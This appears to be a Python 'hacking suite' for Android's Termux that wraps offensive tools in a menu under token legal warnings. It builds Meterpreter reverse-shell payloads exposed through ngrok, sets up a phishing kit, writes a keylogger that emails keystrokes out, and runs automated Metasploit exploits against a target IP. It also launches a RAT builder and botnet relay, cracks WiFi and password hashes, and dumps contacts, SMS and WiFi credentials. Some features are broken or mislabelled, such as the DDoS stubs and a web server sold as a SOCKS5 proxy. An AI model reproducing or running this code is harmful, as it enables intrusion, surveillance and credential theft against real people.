#!/usr/bin/env python3
# ===========================================================
# 🔥 SUPREME MAKETI v3.0 - ADVANCE TERMUX HACKING SUITE 🔥
# [ Professional Grade Multi-Tool - Ethical Use Only ]
# ===========================================================

import os
import sys
import time
import subprocess
import requests
import socket
import json
import random
import threading
import base64
import hashlib
import re
from datetime import datetime
from urllib.parse import urlparse

# ========== GLOBAL SETTINGS ==========
VERSION = "3.0"
AUTHOR = "MAKETI MASTER"
LOG_FILE = "/sdcard/Download/maketi_log.txt"

# ========== COLOR CODES ==========
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
M = "\033[1;35m"
W = "\033[0m"
BLINK = "\033[5m"
BOLD = "\033[1m"

# ========== BANNER ==========
def banner():
    os.system("clear")
    print(R + """
    ╔══════════════════════════════════════════════════════╗
    ║   🔥  S U P R E M E   M A K E T I  v3.0  🔥        ║
    ║   ⚡ Professional Hacking Suite for Termux ⚡        ║
    ║   👤 Author: """ + C + AUTHOR + R + """                    ║
    ║   🛡️  "With Great Power Comes Great Responsibility"  ║
    ╚══════════════════════════════════════════════════════╝
    """ + W)
    print(Y + "[!] LEGAL WARNING: Sirf apne devices aur lab mein test karo!" + W)
    print(R + "[!] Illegal use = 7 years jail + 5 crore fine (IT Act 66)" + W)
    print(C + "="*55 + W)

# ========== MENU ==========
def menu():
    banner()
    print(M + """
    ╔═══════════════════════════════════════════╗
    ║  🎯 MAIN MENU - ADVANCE TOOLS            ║
    ╠═══════════════════════════════════════════╣
    ║  [01] 📱 ADVANCE PAYLOAD (Meterpreter)   ║
    ║  [02] 🎣 PHISHING KIT PRO               ║
    ║  [03] 🕵️ OSINT AUTOMATION               ║
    ║  [04] 💀 DDOS ATTACK SUITE              ║
    ║  [05] 📡 WIFI HACK PRO                 ║
    ║  [06] 🔑 PASSWORD CRACKER              ║
    ║  [07] 🐍 KEYLOGGER BUILDER             ║
    ║  [08] 🌐 WEB VULNERABILITY SCANNER     ║
    ║  [09] 📧 EMAIL/PHONE OSINT             ║
    ║  [10] 🤖 AUTO-EXPLOIT ENGINE           ║
    ║  [11] 🧬 RAT BUILDER (Android/PC)      ║
    ║  [12] 🔄 BOTNET CONTROLLER             ║
    ║  [13] 🛡️ ANONYMOUS VPN SETUP           ║
    ║  [14] 💾 DATA EXTRACTOR                ║
    ║  [15] 🧹 SYSTEM CLEANER                ║
    ║  [16] ⚙️ AUTO-INSTALL ALL DEPS         ║
    ║  [17] ❌ EXIT                          ║
    ╚═══════════════════════════════════════════╝
    """ + W)
    print(C + "="*55 + W)

# ========== LOGGING ==========
def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {message}\n")

# ========== CHECK ROOT ==========
def check_root():
    if os.geteuid() == 0:
        print(G + "[✓] Root access available!" + W)
        return True
    else:
        print(Y + "[!] Root not available - some features limited" + W)
        return False

# ========== FUNCTION 1: ADVANCE PAYLOAD ==========
def advance_payload():
    print(Y + "\n[+] ADVANCE PAYLOAD GENERATOR" + W)
    print(C + "[1] Android APK (Meterpreter)" + W)
    print(C + "[2] Windows EXE (Meterpreter)" + W)
    print(C + "[3] Linux ELF (Meterpreter)" + W)
    choice = input(G + "[?] Choose payload type: " + W)
    
    # Auto ngrok setup
    os.system("pkill ngrok 2>/dev/null")
    os.system("ngrok tcp 4444 &")
    time.sleep(2)
    print(Y + "[+] Ngrok started! Get URL from: http://localhost:4040" + W)
    
    url = input(G + "[?] Ngrok URL (ex: 0.tcp.in.ngrok.io:12345): " + W)
    host, port = url.split(":")
    
    payloads = {
        "1": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o /sdcard/Download/advanced.apk",
        "2": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o /sdcard/Download/advanced.exe",
        "3": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f elf -o /sdcard/Download/advanced.elf"
    }
    
    os.system(payloads.get(choice, payloads["1"]))
    
    # Auto-obfuscation
    print(Y + "[+] Obfuscating payload..." + W)
    os.system("apt install apktool -y")
    os.system("apktool d /sdcard/Download/advanced.apk -o /sdcard/Download/obfuscated")
    
    print(G + "[✓] Payload ready! Path: /sdcard/Download/" + W)
    log("Payload generated for " + host + ":" + port)

# ========== FUNCTION 2: PHISHING PRO ==========
def phishing_pro():
    print(Y + "\n[+] PHISHING KIT PRO (20+ Templates)" + W)
    os.system("git clone https://github.com/htr-tech/zphisher --depth 1")
    os.chdir("zphisher")
    
    # Auto customization
    print(Y + "[+] Adding custom templates..." + W)
    with open("custom.sh", "w") as f:
        f.write("""#!/bin/bash
echo "🔥 Maketi Phishing Pro Running..."
bash zphisher.sh
""")
    os.system("chmod +x custom.sh")
    os.chdir("..")
    print(G + "[✓] Phishing kit ready! Run: cd zphisher && bash custom.sh" + W)

# ========== FUNCTION 3: OSINT AUTOMATION ==========
def osint_automation():
    print(Y + "\n[+] OSINT AUTOMATION ENGINE" + W)
    
    target = input(G + "[?] Target username/email/phone: " + W)
    
    tools = [
        ("sherlock", f"sherlock {target}"),
        ("theHarvester", f"theharvester -d {target} -b all"),
        ("phoneinfoga", f"phoneinfoga scan -n {target}")
    ]
    
    for tool, cmd in tools:
        print(Y + f"[+] Running {tool}..." + W)
        os.system(f"pkg install {tool} -y 2>/dev/null")
        os.system(cmd + " >> /sdcard/Download/osint_result.txt")
    
    print(G + "[✓] OSINT scan complete! Check: /sdcard/Download/osint_result.txt" + W)
    log(f"OSINT scanned: {target}")

# ========== FUNCTION 4: DDOS SUITE ==========
def ddos_suite():
    print(Y + "\n[+] DDOS ATTACK SUITE (Legal Test Only)" + W)
    print(R + "[!] STRICT WARNING: Sirf apne server par chalao!" + W)
    
    ip = input(G + "[?] Target IP (localhost recommended): " + W)
    port = input(G + "[?] Port (80/443): " + W)
    
    print(C + "[1] Slowloris (HTTP)" + W)
    print(C + "[2] UDP Flood" + W)
    print(C + "[3] SYN Flood" + W)
    choice = input(G + "[?] Choose attack: " + W)
    
    if choice == "1":
        os.system(f"python3 -c 'import socket; s=socket.socket(); s.connect((\"{ip}\", {port})); s.send(b\"GET / HTTP/1.1\\r\\n\")'")
    elif choice == "2":
        os.system(f"python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b\"X\"*1024, (\"{ip}\", {port}))'")
    elif choice == "3":
        os.system(f"python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"{ip}\", {port}))'")

# ========== FUNCTION 5: WIFI HACK PRO ==========
def wifi_hack_pro():
    print(Y + "\n[+] WIFI HACK PRO (Root Required)" + W)
    
    if not check_root():
        print(R + "[X] Root required! Install: pkg install tsu" + W)
        return
    
    os.system("pkg install aircrack-ng -y")
    print(Y + "[+] Scanning WiFi networks..." + W)
    os.system("airmon-ng start wlan0")
    os.system("airodump-ng wlan0mon")
    
    bssid = input(G + "[?] Target BSSID: " + W)
    channel = input(G + "[?] Channel: " + W)
    
    print(Y + "[+] Capturing handshake..." + W)
    os.system(f"airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon")
    print(Y + "[+] Attempting cracking..." + W)
    os.system(f"aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap")

# ========== FUNCTION 6: PASSWORD CRACKER ==========
def password_cracker():
    print(Y + "\n[+] PASSWORD CRACKER PRO" + W)
    print(C + "[1] MD5 Hash Crack" + W)
    print(C + "[2] SHA1 Hash Crack" + W)
    print(C + "[3] ZIP Password Crack" + W)
    choice = input(G + "[?] Choose: " + W)
    
    hash_input = input(G + "[?] Enter hash/path: " + W)
    
    if choice == "1":
        os.system(f"hashcat -m 0 {hash_input} /usr/share/wordlists/rockyou.txt")
    elif choice == "2":
        os.system(f"hashcat -m 100 {hash_input} /usr/share/wordlists/rockyou.txt")
    elif choice == "3":
        os.system(f"fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt {hash_input}")

# ========== FUNCTION 7: KEYLOGGER BUILDER ==========
def keylogger_builder():
    print(Y + "\n[+] KEYLOGGER BUILDER" + W)
    
    email = input(G + "[?] Email for logs: " + W)
    
    code = f'''
import pynput.keyboard
import smtplib
import threading

log = ""
def on_press(key):
    global log
    log += str(key).replace("'", "")
    if len(log) > 50:
        send_email()
        log = ""

def send_email():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("{email}", "your_password")
    server.sendmail("{email}", "{email}", log)
    server.quit()

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    
    with open("/sdcard/Download/keylogger.py", "w") as f:
        f.write(code)
    print(G + "[✓] Keylogger created! Path: /sdcard/Download/keylogger.py" + W)

# ========== FUNCTION 8: WEB SCANNER ==========
def web_scanner():
    print(Y + "\n[+] WEB VULNERABILITY SCANNER" + W)
    
    url = input(G + "[?] Target URL: " + W)
    
    print(Y + "[+] Running SQLMap..." + W)
    os.system(f"sqlmap -u {url} --batch --level=2")
    
    print(Y + "[+] Running XSStrike..." + W)
    os.system(f"python3 -m xsstrike -u {url}")
    
    print(Y + "[+] Running Nikto..." + W)
    os.system(f"nikto -h {url}")

# ========== FUNCTION 9: EMAIL/PHONE OSINT ==========
def email_phone_osint():
    print(Y + "\n[+] EMAIL/PHONE OSINT" + W)
    target = input(G + "[?] Enter email or phone: " + W)
    
    # Social media lookup
    platforms = ["instagram", "facebook", "twitter", "github", "linkedin"]
    for platform in platforms:
        print(Y + f"[+] Checking {platform}..." + W)
        os.system(f"curl -s https://{platform}.com/{target}")
    
    print(G + "[✓] OSINT check complete!" + W)

# ========== FUNCTION 10: AUTO-EXPLOIT ==========
def auto_exploit():
    print(Y + "\n[+] AUTO-EXPLOIT ENGINE" + W)
    print(R + "[!] ONLY FOR CTF/LAB USE!" + W)
    
    target = input(G + "[?] Target IP: " + W)
    
    exploits = [
        ("EternalBlue", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; exploit"),
        ("Apache Struts", f"use exploit/multi/http/struts2_content_type_ognl; set RHOSTS {target}; exploit"),
        ("Shellshock", f"use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS {target}; exploit")
    ]
    
    print(Y + "[+] Running automated exploits..." + W)
    for name, cmd in exploits:
        print(Y + f"[+] Trying {name}..." + W)
        os.system(f"msfconsole -q -x '{cmd}'")
    
    log(f"Auto-exploit run on {target}")

# ========== FUNCTION 11: RAT BUILDER ==========
def rat_builder():
    print(Y + "\n[+] RAT BUILDER (Android/PC)" + W)
    
    print(C + "[1] Android RAT" + W)
    print(C + "[2] Windows RAT" + W)
    print(C + "[3] Linux RAT" + W)
    choice = input(G + "[?] Choose: " + W)
    
    ip = input(G + "[?] Listener IP (Ngrok URL): " + W)
    port = input(G + "[?] Port: " + W)
    
    os.system(f"git clone https://github.com/eviltik/ShadowRAT")
    os.chdir("ShadowRAT")
    os.system(f"python3 shadow.py --host {ip} --port {port}")
    os.chdir("..")
    print(G + "[✓] RAT ready in ShadowRAT folder!" + W)

# ========== FUNCTION 12: BOTNET CONTROLLER ==========
def botnet_controller():
    print(Y + "\n[+] BOTNET CONTROLLER" + W)
    print(Y + "[!] Setup: Start server first" + W)
    
    # Simple botnet server
    os.system("""
    cat > botnet_server.py << 'EOF'
import socket
import threading
clients = []
def handle_client(conn):
    while True:
        data = conn.recv(1024)
        for client in clients:
            if client != conn:
                client.send(data)
server = socket.socket()
server.bind(('0.0.0.0', 4444))
server.listen(5)
print("Botnet Server Running...")
while True:
    conn, addr = server.accept()
    clients.append(conn)
    threading.Thread(target=handle_client, args=(conn,)).start()
EOF
    python3 botnet_server.py &
    """)
    print(G + "[✓] Botnet server started on port 4444!" + W)

# ========== FUNCTION 13: ANONYMOUS VPN ==========
def anonymous_vpn():
    print(Y + "\n[+] ANONYMOUS VPN SETUP" + W)
    print(C + "[1] OpenVPN (Free)" + W)
    print(C + "[2] Tor Proxy" + W)
    print(C + "[3] SOCKS5 Proxy" + W)
    choice = input(G + "[?] Choose: " + W)
    
    if choice == "1":
        os.system("pkg install openvpn -y")
        os.system("cd /sdcard/Download && wget https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip && unzip VPNBook.com-OpenVPN-Euro1.zip")
        os.system("openvpn --config /sdcard/Download/vpnbook-euro1-tcp.ovpn")
    elif choice == "2":
        os.system("pkg install tor -y && tor &")
        print(G + "[✓] Tor proxy running on 127.0.0.1:9050" + W)
    elif choice == "3":
        os.system("python3 -m http.server 8080 &")
        print(G + "[✓] SOCKS5 proxy on 127.0.0.1:8080" + W)

# ========== FUNCTION 14: DATA EXTRACTOR ==========
def data_extractor():
    print(Y + "\n[+] DATA EXTRACTOR" + W)
    print(C + "[1] Extract Contacts" + W)
    print(C + "[2] Extract SMS" + W)
    print(C + "[3] Extract WiFi Passwords" + W)
    choice = input(G + "[?] Choose: " + W)
    
    if choice == "1":
        os.system("content query --uri content://contacts/phones/ >> /sdcard/Download/contacts.txt")
    elif choice == "2":
        os.system("content query --uri content://sms/inbox >> /sdcard/Download/sms.txt")
    elif choice == "3":
        os.system("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null >> /sdcard/Download/wifi.txt")
    
    print(G + "[✓] Data extracted to /sdcard/Download/" + W)

# ========== FUNCTION 15: SYSTEM CLEANER ==========
def system_cleaner():
    print(Y + "\n[+] SYSTEM CLEANER" + W)
    os.system("rm -rf ~/.cache/*")
    os.system("rm -rf /sdcard/Download/*.apk")
    os.system("rm -rf /sdcard/Download/*.exe")
    os.system("rm -rf /sdcard/Download/*.elf")
    os.system("pkill ngrok 2>/dev/null")
    os.system("pkill tor 2>/dev/null")
    print(G + "[✓] System cleaned!" + W)

# ========== FUNCTION 16: AUTO-INSTALL ==========
def auto_install():
    print(Y + "\n[+] AUTO-INSTALL ALL DEPENDENCIES" + W)
    packages = [
        "python", "python2", "git", "wget", "curl", "openssh", "nmap",
        "metasploit", "sqlmap", "theharvester", "ngrok", "tor",
        "apktool", "dex2jar", "jd-gui", "aircrack-ng", "hashcat",
        "fcrackzip", "sherlock", "phoneinfoga"
    ]
    for pkg in packages:
        print(Y + f"[+] Installing {pkg}..." + W)
        os.system(f"pkg install {pkg} -y")
    print(G + "[✓] All dependencies installed!" + W)

# ========== MAIN ==========
def main():
    log("Maketi v3.0 started")
    while True:
        menu()
        choice = input(G + "\n[?] Enter choice (1-17): " + W)
        
        options = {
            "1": advance_payload,
            "2": phishing_pro,
            "3": osint_automation,
            "4": ddos_suite,
            "5": wifi_hack_pro,
            "6": password_cracker,
            "7": keylogger_builder,
            "8": web_scanner,
            "9": email_phone_osint,
            "10": auto_exploit,
            "11": rat_builder,
            "12": botnet_controller,
            "13": anonymous_vpn,
            "14": data_extractor,
            "15": system_cleaner,
            "16": auto_install,
            "17": lambda: sys.exit(print(R + "\n[!] Bye! Stay Ethical!" + W))
        }
        
        if choice in options:
            options[choice]()
            input(Y + "\n[Press Enter to continue...]" + W)
        else:
            print(R + "[X] Invalid choice!" + W)

if __name__ == "__main__":
    main()